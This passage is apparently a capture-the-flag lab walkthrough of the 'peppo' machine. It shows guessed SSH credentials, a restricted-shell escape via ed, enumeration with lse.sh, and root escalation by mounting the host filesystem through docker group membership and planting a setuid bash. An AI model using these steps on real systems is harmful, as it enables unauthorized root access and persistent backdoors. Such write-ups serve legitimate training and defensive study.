                        *)        echo "$0: ignoring $f" ;;
                esac
                echo
        done
}

# Execute sql script, passed via stdin (or -f flag of pqsl)
# usage: docker_process_sql [psql-cli-args]
#    ie: docker_process_sql --dbname=mydb <<<'INSERT ...'
#    ie: docker_process_sql -f my-file.sql
#    ie: docker_process_sql <my-file.sql
docker_process_sql() {
        local query_runner=( psql -v ON_ERROR_STOP=1 --username "$POSTGRES_USER" --no-password )
        if [ -n "$POSTGRES_DB" ]; then
                query_runner+=( --dbname "$POSTGRES_DB" )
        fi

        "${query_runner[@]}" "$@"
}

# create initial database
# uses environment variables for input: POSTGRES_DB
docker_setup_db() {
        if [ "$POSTGRES_DB" != 'postgres' ]; then
                POSTGRES_DB= docker_process_sql --dbname postgres --set db="$POSTGRES_DB" <<-'EOSQL'
                        CREATE DATABASE :"db" ;
                EOSQL
                echo
        fi
}

# Loads various settings that are used elsewhere in the script
# This should be called before any other functions
docker_setup_env() {
        file_env 'POSTGRES_PASSWORD'

        file_env 'POSTGRES_USER' 'postgres'
        file_env 'POSTGRES_DB' "$POSTGRES_USER"
        file_env 'POSTGRES_INITDB_ARGS'
        # default authentication method is md5
        : "${POSTGRES_HOST_AUTH_METHOD:=md5}"

        declare -g DATABASE_ALREADY_EXISTS
        # look specifically for PG_VERSION, as it is expected in the DB dir
        if [ -s "$PGDATA/PG_VERSION" ]; then
                DATABASE_ALREADY_EXISTS='true'
        fi
}

# append POSTGRES_HOST_AUTH_METHOD to pg_hba.conf for "host" connections
pg_setup_hba_conf() {
        {
                echo
                if [ 'trust' = "$POSTGRES_HOST_AUTH_METHOD" ]; then
                        echo '# warning trust is enabled for all connections'
                        echo '# see https://www.postgresql.org/docs/12/auth-trust.html'
                fi
                echo "host all all all $POSTGRES_HOST_AUTH_METHOD"
        } >> "$PGDATA/pg_hba.conf"
}

# start socket-only postgresql server for setting up or running scripts
# all arguments will be passed along as arguments to `postgres` (via pg_ctl)
docker_temp_server_start() {
        if [ "$1" = 'postgres' ]; then
                shift
        fi

        # internal start of server in order to allow setup using psql client
        # does not listen on external TCP/IP and waits until start finishes
        set -- "$@" -c listen_addresses='' -p "${PGPORT:-5432}"

        PGUSER="${PGUSER:-$POSTGRES_USER}" \
        pg_ctl -D "$PGDATA" \
                -o "$(printf '%q ' "$@")" \
                -w start
}

# stop postgresql server after done setting up user and running scripts
docker_temp_server_stop() {
        PGUSER="${PGUSER:-postgres}" \
        pg_ctl -D "$PGDATA" -m fast -w stop
}

# check arguments for an option that would cause postgres to stop
# return true if there is one
_pg_want_help() {
        local arg
        for arg; do
                case "$arg" in
                        # postgres --help | grep 'then exit'
                        # leaving out -C on purpose since it always fails and is unhelpful:
                        # postgres: could not access the server configuration file "/var/lib/postgresql/data/postgresql.conf": No such file or directory
                        -'?'|--help|--describe-config|-V|--version)
                                return 0
                                ;;
                esac
        done
        return 1
}

_main() {
        # if first arg looks like a flag, assume we want to run postgres server
        if [ "${1:0:1}" = '-' ]; then
                set -- postgres "$@"
        fi

        if [ "$1" = 'postgres' ] && ! _pg_want_help "$@"; then
                docker_setup_env
                # setup data directories and permissions (when run as root)
                docker_create_db_directories
                if [ "$(id -u)" = '0' ]; then
                        # then restart script as postgres user
                        exec gosu postgres "$BASH_SOURCE" "$@"
                fi

                # only run initialization on an empty data directory
                if [ -z "$DATABASE_ALREADY_EXISTS" ]; then
                        docker_verify_minimum_env

                        # check dir permissions to reduce likelihood of half-initialized database
                        ls /docker-entrypoint-initdb.d/ > /dev/null

                        docker_init_database_dir
                        pg_setup_hba_conf

                        # PGPASSWORD is required for psql when authentication is required for 'local' connections via pg_hba.conf and is otherwise harmless
                        # e.g. when '--auth=md5' or '--auth-local=md5' is used in POSTGRES_INITDB_ARGS
                        export PGPASSWORD="${PGPASSWORD:-$POSTGRES_PASSWORD}"
                        docker_temp_server_start "$@"

                        docker_setup_db
                        docker_process_init_files /docker-entrypoint-initdb.d/*

                        docker_temp_server_stop
                        unset PGPASSWORD

                        echo
                        echo 'PostgreSQL init process complete; ready for start up.'
                        echo
                else
                        echo
                        echo 'PostgreSQL Database directory appears to contain a database; Skipping initialization'
                        echo
                fi
        fi

        exec "$@"
}

if ! _is_sourced; then
        _main "$@"
fi
postgres@326cfee15738:/$ 
bash: cd: too many arguments
postgres@326cfee15738:/$ cd docker-entrypoint-initdb.d
cd docker-entrypoint-initdb.d
postgres@326cfee15738:/docker-entrypoint-initdb.d$ ls
ls
postgres@326cfee15738:/docker-entrypoint-initdb.d$ ls -al
ls -al
total 8
drwxr-xr-x 2 root root 4096 May 16  2020 .
drwxr-xr-x 1 root root 4096 Jun  1  2020 ..
postgres@326cfee15738:/docker-entrypoint-initdb.d$ 

```


# Actual Exploit

identd reveals a user eleanor
Guessed credentials are `eleanor`:`eleanor`

```
┌──(kali㉿kali)-[~]
└─$ ssh eleanor@192.168.171.60         
eleanor@192.168.171.60's password: 
Linux peppo 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
eleanor@peppo:~$ ls
bin  helloworld  local.txt
eleanor@peppo:~$ # Password is eleanor
eleanor@peppo:~$ cat local.txt
-rbash: cat: command not found
eleanor@peppo:~$ exit
logout
Connection to 192.168.171.60 closed.
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ ssh eleanor@192.168.171.60 -t "bash --noprofile -i"                                                                                                           127 ⨯
eleanor@192.168.171.60's password: 
rbash: bash: command not found
Connection to 192.168.171.60 closed.
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

## Rbash escape

https://gtfobins.github.io/gtfobins/ed/

```
┌──(kali㉿kali)-[~]
└─$ ssh eleanor@192.168.171.60                                                                                                                                      1 ⨯
eleanor@192.168.171.60's password: 
Linux peppo 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jan 23 05:39:04 2022 from 192.168.49.171
eleanor@peppo:~$ ls -alR
.:
total 32
drwxr-xr-x 4 eleanor eleanor 4096 Jan 23 05:35 .
drwxr-xr-x 3 root    root    4096 May 25  2020 ..
-rw------- 1 eleanor eleanor  279 Jan 23 05:42 .bash_history
-rw-r--r-- 1 eleanor eleanor   30 Jun  1  2020 .bashrc
drwxr-xr-x 2 eleanor eleanor 4096 Jun  1  2020 bin
drwxr-xr-x 2 root    root    4096 Jun  1  2020 helloworld
-rw-r--r-- 1 eleanor eleanor   33 Jan 23 03:27 local.txt
-rw-r--r-- 1 eleanor eleanor   30 Jun  1  2020 .profile

./bin:
total 8
drwxr-xr-x 2 eleanor eleanor 4096 Jun  1  2020 .
drwxr-xr-x 4 eleanor eleanor 4096 Jan 23 05:35 ..
lrwxrwxrwx 1 root    root      10 Jun  1  2020 chmod -> /bin/chmod
lrwxrwxrwx 1 root    root      10 Jun  1  2020 chown -> /bin/chown
lrwxrwxrwx 1 root    root       7 Jun  1  2020 ed -> /bin/ed
lrwxrwxrwx 1 root    root       7 Jun  1  2020 ls -> /bin/ls
lrwxrwxrwx 1 root    root       7 Jun  1  2020 mv -> /bin/mv
lrwxrwxrwx 1 root    root       9 Jun  1  2020 ping -> /bin/ping
lrwxrwxrwx 1 root    root      10 Jun  1  2020 sleep -> /bin/sleep
lrwxrwxrwx 1 root    root      14 Jun  1  2020 touch -> /usr/bin/touch

./helloworld:
total 12
drwxr-xr-x 2 root    root    4096 Jun  1  2020 .
drwxr-xr-x 4 eleanor eleanor 4096 Jan 23 05:35 ..
-rw-r--r-- 1 eleanor eleanor  270 Jun  1  2020 index.js
eleanor@peppo:~$ echo $PATH
/home/eleanor/bin
eleanor@peppo:~$ ed
!/bin/bash
eleanor@peppo:~$ cat local.txt
bash: cat: command not found
eleanor@peppo:~$ echo $PATH
/home/eleanor/bin
eleanor@peppo:~$ PATH=/usr/bin:/bin:/sbin
eleanor@peppo:~$ cat local.txt
f01e2946b8e0f8abf17b3c5ec00c8aa1
eleanor@peppo:~$ ifconfig
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:dd:5c:97:14  txqueuelen 0  (Ethernet)
        RX packets 316023  bytes 144278830 (137.5 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 466011  bytes 46393991 (44.2 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.171.60  netmask 255.255.255.0  broadcast 192.168.171.255
        ether 00:50:56:bf:19:1f  txqueuelen 1000  (Ethernet)
        RX packets 670119  bytes 58839238 (56.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 318536  bytes 149247243 (142.3 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth99b6681: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        ether a6:f3:30:de:2a:26  txqueuelen 0  (Ethernet)
        RX packets 1225  bytes 142793 (139.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1457  bytes 117680 (114.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vethebb7a08: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        ether 7a:8a:bd:59:ad:38  txqueuelen 0  (Ethernet)
        RX packets 314798  bytes 148560359 (141.6 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 464562  bytes 46277695 (44.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eleanor@peppo:~$ 

```

![](Pasted%20image%2020220123184439.png)


# Privesc

## lse

```
eleanor@peppo:/tmp$ nano lse.sh
eleanor@peppo:/tmp$ chmod +x/lse.sh
chmod: missing operand after ‘+x/lse.sh’
Try 'chmod --help' for more information.
eleanor@peppo:/tmp$ chmod +x lse.sh
eleanor@peppo:/tmp$ ./lse.sh
---
If you know the current user password, write it here to check sudo privileges: eleanor                                                                                  
---
                                                                                                                                                                        
 LSE Version: 3.7                                                                                                                                                       

        User: eleanor
     User ID: 1000
    Password: ******
        Home: /home/eleanor
        Path: /usr/bin:/bin:/sbin
       umask: 0022

    Hostname: peppo
       Linux: 4.9.0-12-amd64
Distribution: Debian GNU/Linux 9.12 (stretch)
Architecture: x86_64

==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... nope
[*] usr020 Are there other users in administrative groups?................. nope
[*] usr030 Other users with shell.......................................... yes!
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip                                                                                        
[i] usr060 Other users..................................................... skip                                                                                        
[*] usr070 PATH variables defined inside /etc.............................. yes!                                                                                        
[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... nope
[!] sud020 Can we sudo with a password?.................................... nope
[!] sud030 Can we list sudo commands with a password?...................... nope
[*] sud040 Can we read sudoers files?...................................... nope
[*] sud050 Do we know if any other users used sudo?........................ nope
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. yes!
[*] fst010 Binaries with setuid bit........................................ yes!
[!] fst020 Uncommon setuid binaries........................................ nope
[!] fst030 Can we write to any setuid binary?.............................. nope
[*] fst040 Binaries with setgid bit........................................ skip
[!] fst050 Uncommon setgid binaries........................................ skip                                                                                        
[!] fst060 Can we write to any setgid binary?.............................. skip                                                                                        
[*] fst070 Can we read /root?.............................................. nope                                                                                        
[*] fst080 Can we read subdirectories under /home?......................... nope
[*] fst090 SSH files in home directories................................... nope
[*] fst100 Useful binaries................................................. yes!
[*] fst110 Other interesting files in home directories..................... nope
[!] fst120 Are there any credentials in fstab/mtab?........................ yes!
---
/etc/mtab:overlay /var/lib/docker/overlay2/9044167633acb5527fbca7686b0932a351288c1e11a7cc164edc68220cc75f50/merged overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/5ZYB55BQ7MLN7L4LQLDGFS4UKW:/var/lib/docker/overlay2/l/SAUUVFQQSYNWW3KP5HCSPP4HSP:/var/lib/docker/overlay2/l/NVWGKA4YJEZORMU5BTDJD3AZQH:/var/lib/docker/overlay2/l/QUUNMUYZ7KS2B2JYKQLKTX2QWD:/var/lib/docker/overlay2/l/FFOL4GGTTBGT5XJCRUVLAP3HMM:/var/lib/docker/overlay2/l/MJ4UPM34PJREEY6NWY2UXFTLDA:/var/lib/docker/overlay2/l/JRIYIFDYQFWCU657FFJET63DYR:/var/lib/docker/overlay2/l/DTQJ2UWRS2R37ENMP26JKGGJPO:/var/lib/docker/overlay2/l/7QAUH2NAL27KM72WNRXTCFSV7P:/var/lib/docker/overlay2/l/KWP67NUIPOPUEZ3NTLRL5VJKPW:/var/lib/docker/overlay2/l/PPTU6XFWLUIWI2UE3GDETXPG2W:/var/lib/docker/overlay2/l/JA67L6K2NRXT5HOPDOJ2H76CXQ:/var/lib/docker/overlay2/l/7XBRXDSA62FZCJZUXCNH577I5I:/var/lib/docker/overlay2/l/BKEHVD5OQVAFOKQVTHQXMZ2ENF:/var/lib/docker/overlay2/l/7FQFNJK4IKDOGYXARETCNFUHX6,upperdir=/var/lib/docker/overlay2/9044167633acb5527fbca7686b0932a351288c1e11a7cc164edc68220cc75f50/diff,workdir=/var/lib/docker/overlay2/9044167633acb5527fbca7686b0932a351288c1e11a7cc164edc68220cc75f50/work 0 0
---
[*] fst130 Does 'eleanor' have mail?....................................... yes!
[!] fst140 Can we access other users mail?................................. nope
[*] fst150 Looking for GIT/SVN repositories................................ nope
[!] fst160 Can we write to critical files?................................. nope
[!] fst170 Can we write to critical directories?........................... nope
[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
[!] fst190 Can we read any backup?......................................... nope
[!] fst200 Are there possible credentials in any shell history file?....... yes!
---
# Password is eleanor
---
[!] fst210 Are there NFS exports with 'no_root_squash' option?............. nope
[*] fst220 Are there NFS exports with 'no_all_squash' option?.............. nope
[i] fst500 Files owned by user 'eleanor'................................... skip
[i] fst510 SSH files anywhere.............................................. skip                                                                                        
[i] fst520 Check hosts.equiv file and its contents......................... skip                                                                                        
[i] fst530 List NFS server shares.......................................... skip                                                                                        
[i] fst540 Dump fstab file................................................. skip                                                                                        
=================================================================( system )=====                                                                                        
[i] sys000 Who is logged in................................................ skip
[i] sys010 Last logged in users............................................ skip                                                                                        
[!] sys020 Does the /etc/passwd have hashes?............................... nope                                                                                        
[!] sys022 Does the /etc/group have hashes?................................ nope
[!] sys030 Can we read shadow files?....................................... nope
[*] sys040 Check for other superuser accounts.............................. nope
[*] sys050 Can root user log in via SSH?................................... yes!
[i] sys060 List available shells........................................... skip
[i] sys070 System umask in /etc/login.defs................................. skip                                                                                        
[i] sys080 System password policies in /etc/login.defs..................... skip                                                                                        
===============================================================( security )=====                                                                                        
[*] sec000 Is SELinux present?............................................. nope
[*] sec010 List files with capabilities.................................... yes!
[!] sec020 Can we write to a binary with caps?............................. nope
[!] sec030 Do we have all caps in any binary?.............................. nope
[*] sec040 Users with associated capabilities.............................. nope
[!] sec050 Does current user have capabilities?............................ skip
[!] sec060 Can we read the auditd log?..................................... nope                                                                                        
========================================================( recurrent tasks )=====
[*] ret000 User crontab.................................................... nope
[!] ret010 Cron tasks writable by user..................................... nope
[*] ret020 Cron jobs....................................................... yes!
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. nope
[!] ret060 Can we write to executable paths present in cron jobs........... skip
[i] ret400 Cron files...................................................... skip                                                                                        
[*] ret500 User systemd timers............................................. nope                                                                                        
[!] ret510 Can we write in any system timer?............................... nope
[i] ret900 Systemd timers.................................................. skip
================================================================( network )=====                                                                                        
[*] net000 Services listening only on localhost............................ nope
[!] net010 Can we sniff traffic with tcpdump?.............................. nope
[i] net500 NIC and IP information.......................................... skip
[i] net510 Routing table................................................... skip                                                                                        
[i] net520 ARP table....................................................... skip                                                                                        
[i] net530 Nameservers..................................................... skip                                                                                        
[i] net540 Systemd Nameservers............................................. skip                                                                                        
[i] net550 Listening TCP................................................... skip                                                                                        
[i] net560 Listening UDP................................................... skip                                                                                        
===============================================================( services )=====                                                                                        
[!] srv000 Can we write in service files?.................................. nope
[!] srv010 Can we write in binaries executed by services?.................. nope
[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
[*] srv040 Upstart files not belonging to root............................. nope
[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
[i] srv400 Contents of /etc/inetd.conf..................................... skip
[i] srv410 Contents of /etc/xinetd.conf.................................... skip                                                                                        
[i] srv420 List /etc/xinetd.d if used...................................... skip                                                                                        
[i] srv430 List /etc/init.d/ permissions................................... skip                                                                                        
[i] srv440 List /etc/rc.d/init.d permissions............................... skip                                                                                        
[i] srv450 List /usr/local/etc/rc.d permissions............................ skip                                                                                        
[i] srv460 List /etc/init/ permissions..................................... skip                                                                                        
[!] srv500 Can we write in systemd service files?.......................... nope                                                                                        
[!] srv510 Can we write in binaries executed by systemd services?.......... nope
[*] srv520 Systemd files not belonging to root............................. nope
[i] srv900 Systemd config files permissions................................ skip
===============================================================( software )=====                                                                                        
[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
[!] sof010 Can we connect to MySQL as root without password?............... nope
[!] sof015 Are there credentials in mysql_history file?.................... nope
[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
[*] sof030 Installed apache modules........................................ nope
[!] sof040 Found any .htpasswd files?...................................... nope
[!] sof050 Are there private keys in ssh-agent?............................ nope
[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
[!] sof070 Can we write to a ssh-agent socket?............................. nope
[!] sof080 Can we write to a gpg-agent socket?............................. yes!
---
/run/user/1000/gnupg/S.gpg-agent.ssh
/run/user/1000/gnupg/S.gpg-agent.extra
/run/user/1000/gnupg/S.gpg-agent
/run/user/1000/gnupg/S.gpg-agent.browser
---
[!] sof090 Found any keepass database files?............................... nope
[!] sof100 Found any 'pass' store directories?............................. nope
[!] sof110 Are there any tmux sessions available?.......................... nope
[*] sof120 Are there any tmux sessions from other users?................... nope
[!] sof130 Can we write to tmux session sockets from other users?.......... nope
[!] sof140 Are any screen sessions available?.............................. nope
[*] sof150 Are there any screen sessions from other users?................. nope
[!] sof160 Can we write to screen session sockets from other users?........ nope
[i] sof500 Sudo version.................................................... skip
[i] sof510 MySQL version................................................... skip                                                                                        
[i] sof520 Postgres version................................................ skip                                                                                        
[i] sof530 Apache version.................................................. skip                                                                                        
[i] sof540 Tmux version.................................................... skip                                                                                        
[i] sof550 Screen version.................................................. skip                                                                                        
=============================================================( containers )=====                                                                                        
[*] ctn000 Are we in a docker container?................................... nope
[*] ctn010 Is docker available?............................................ yes!
[!] ctn020 Is the user a member of the 'docker' group?..................... yes!
---
docker
---
[*] ctn200 Are we in a lxc container?...................................... nope
[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope
==============================================================( processes )=====
[i] pro000 Waiting for the process monitor to finish....................... yes!
[i] pro001 Retrieving process binaries..................................... yes!
[i] pro002 Retrieving process users........................................ yes!
[!] pro010 Can we write in any process binary?............................. nope
[*] pro020 Processes running with root permissions......................... yes!
[*] pro030 Processes running by non-root users with shell.................. yes!
[i] pro500 Running processes............................................... skip
[i] pro510 Running process binaries and permissions........................ skip                                                                                        
                                                                                                                                                                        
==================================( FINISHED )==================================                                                                                        
You have new mail in /var/mail/eleanor
eleanor@peppo:/tmp$ groups
eleanor cdrom floppy audio dip video plugdev netdev docker
eleanor@peppo:/tmp$ ls /var/mail/eleanor
/var/mail/eleanor
eleanor@peppo:/tmp$ file /var/mail/eleanor
/var/mail/eleanor: ASCII text
eleanor@peppo:/tmp$ cat /var/mail/eleanor
From eleanor@peppo Sun Jan 23 05:45:43 2022
Return-path: <eleanor@peppo>
Envelope-to: root@peppo
Delivery-date: Sun, 23 Jan 2022 05:45:43 -0500
Received: from eleanor by peppo with local (Exim 4.89)
        (envelope-from <eleanor@peppo>)
        id 1nBaNS-0000kr-Ei
        for root@peppo; Sun, 23 Jan 2022 05:45:42 -0500
To: root@peppo
Auto-Submitted: auto-generated
Subject: *** SECURITY information for peppo ***
From: eleanor <eleanor@peppo>
Message-Id: <E1nBaNS-0000kr-Ei@peppo>
Date: Sun, 23 Jan 2022 05:45:42 -0500

peppo : Jan 23 05:45:42 : eleanor : user NOT in sudoers ; TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/id


From eleanor@peppo Sun Jan 23 05:45:46 2022
Return-path: <eleanor@peppo>
Envelope-to: root@peppo
Delivery-date: Sun, 23 Jan 2022 05:45:46 -0500
Received: from eleanor by peppo with local (Exim 4.89)
        (envelope-from <eleanor@peppo>)
        id 1nBaNS-0000ke-Dh
        for root@peppo; Sun, 23 Jan 2022 05:45:42 -0500
To: root@peppo
Auto-Submitted: auto-generated
Subject: *** SECURITY information for peppo ***
From: eleanor <eleanor@peppo>
Message-Id: <E1nBaNS-0000ke-Dh@peppo>
Date: Sun, 23 Jan 2022 05:45:42 -0500

peppo : Jan 23 05:45:42 : eleanor : a password is required ; TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=list


eleanor@peppo:/tmp$ 

```

## Docker

```
eleanor@peppo:/tmp$ groups
eleanor cdrom floppy audio dip video plugdev netdev docker
eleanor@peppo:/tmp$ docker image ls
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
redmine             latest              0c8429c66e07        20 months ago       542MB
postgres            latest              adf2b126dda8        20 months ago       313MB
eleanor@peppo:/tmp$ docker stop postgres
postgres
eleanor@peppo:/tmp$ docker run -v /:/mnt --rm -it postgres bash
root@52d01126dbbd:/# cd /mnt
root@52d01126dbbd:/mnt# ls
bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old
root@52d01126dbbd:/mnt# cd root
root@52d01126dbbd:/mnt/root# ls
proof.txt
root@52d01126dbbd:/mnt/root# cat proof.txt
1d4d52649a4794aa72fcbe076812c31c
root@52d01126dbbd:/mnt/root# cp /mnt/bin/bash /mnt/home/eleanor/
root@52d01126dbbd:/mnt/root# chmod 777 /mnt/home/eleanor/bash
root@52d01126dbbd:/mnt/root# chmod u+s /mnt/home/eleanor/bash
root@52d01126dbbd:/mnt/root# exit
exit
eleanor@peppo:/tmp$ cd ~
eleanor@peppo:~$ ./bash -p
bash-4.4# cd /root
bash-4.4# cat proof.txt
1d4d52649a4794aa72fcbe076812c31c
bash-4.4# ifconfig
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:dd:5c:97:14  txqueuelen 0  (Ethernet)
        RX packets 336995  bytes 152989360 (145.9 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 497425  bytes 49515753 (47.2 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.171.60  netmask 255.255.255.0  broadcast 192.168.171.255
        ether 00:50:56:bf:19:1f  txqueuelen 1000  (Ethernet)
        RX packets 703169  bytes 62131371 (59.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 340721  bytes 158449039 (151.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vethebb7a08: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        ether 7a:8a:bd:59:ad:38  txqueuelen 0  (Ethernet)
        RX packets 335761  bytes 157563430 (150.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 495969  bytes 49399018 (47.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

bash-4.4# 

```


![](Pasted%20image%2020220123185343.png)
# Others

